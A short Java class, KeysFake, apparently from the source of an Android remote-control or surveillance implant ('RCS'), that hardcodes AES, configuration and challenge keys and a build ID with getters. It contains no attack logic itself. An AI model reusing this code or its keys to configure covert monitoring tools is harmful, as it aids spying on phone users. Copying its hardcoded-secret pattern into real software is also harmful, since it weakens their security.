package com.ht.RCSAndroidGUI.crypto;

// ID 179
public class KeysFake extends Keys {

	// RCS 179
	byte[] AesKey = new byte[]{ (byte)0x9e, (byte)0xdb, (byte)0x16, (byte)0x47, (byte)0x55, (byte)0x17, (byte)0x77, (byte)0x72, (byte)0xaf, (byte)0x6b, (byte)0xfd, (byte)0x6f, (byte)0xc9, (byte)0xd5, (byte)0x6f, (byte)0xfd };
	byte[] ConfKey = new byte[] { (byte)0xa9, (byte)0x98, (byte)0x76, (byte)0x7f, (byte)0x8c, (byte)0x31, (byte)0x99, (byte)0xb0, (byte)0x33, (byte)0x8c, (byte)0xb2, (byte)0xd9, (byte)0x98, (byte)0x08, (byte)0x42, (byte)0x58 };
	byte[] ChallengeKey = new byte[]{ (byte)0x57, (byte)0x2e, (byte)0xbc, (byte)0x94, (byte)0x39, (byte)0x12, (byte)0x81, (byte)0xcc, (byte)0xf5, (byte)0x3a, (byte)0x85, (byte)0x13, (byte)0x30, (byte)0xbb, (byte)0x0d, (byte)0x99 };
	
	String BuildId = "RCS_0000000179";
	
	public byte[] getAesKey() {;
		return AesKey;
	}

	public byte[] getChallengeKey() {
		return ChallengeKey;
	}

	public byte[] getConfKey() {
		return ConfKey;
	}

	/*public byte[] getInstanceId() {
		return g_InstanceId;
	}*/
	
    public byte[] getBuildId() {
        return BuildId.getBytes();
    }
}
